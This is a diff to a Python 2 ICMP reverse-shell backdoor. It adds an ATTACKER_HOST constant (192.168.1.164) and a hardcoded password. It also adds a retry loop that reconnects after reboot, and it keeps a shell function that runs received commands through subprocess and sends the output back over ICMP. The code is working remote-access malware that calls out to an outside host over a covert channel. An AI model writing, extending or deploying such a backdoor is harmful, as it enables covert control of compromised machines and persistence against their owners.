@@ -3,8 +3,9 @@
 
 import os, sys, socket, struct, select, time, string, argparse, subprocess
 from icmpclient import Icmpclient
-ICMP_ECHO_REQUEST = 8
 
+## CONFIG
+ATTACKER_HOST = "192.168.1.164"
 PASSWORD = "123mudar"
 
 def shell(client):
@@ -26,14 +27,24 @@ def shell(client):
             output += proc.stderr.read()
             client.send(output.strip())
             time.sleep(1)
-    
+
+############## MAIN ###############
 ID = os.getpid() & 0xFFFF
-s = Icmpclient("10.0.24.5", ID, "127.0.0.1")
+
+# retry socket opening until success
+# for when the network is not up yet on reboot
+while True:
+    try:
+        s = Icmpclient(ID, ATTACKER_HOST)
+        break
+    except Exception, err:
+        if err.errno == 1: #permission denied
+            raise
+        time.sleep(1)
 
 while True:
     s.send("Login with your password")
-    resp = s.recv(1) # gets ping answer
-    #resp2 = s.recv(2) # wait for password
+    resp = s.recv(5) # wait for password
     if resp == PASSWORD:
         s.send("Connected")
         shell(s)
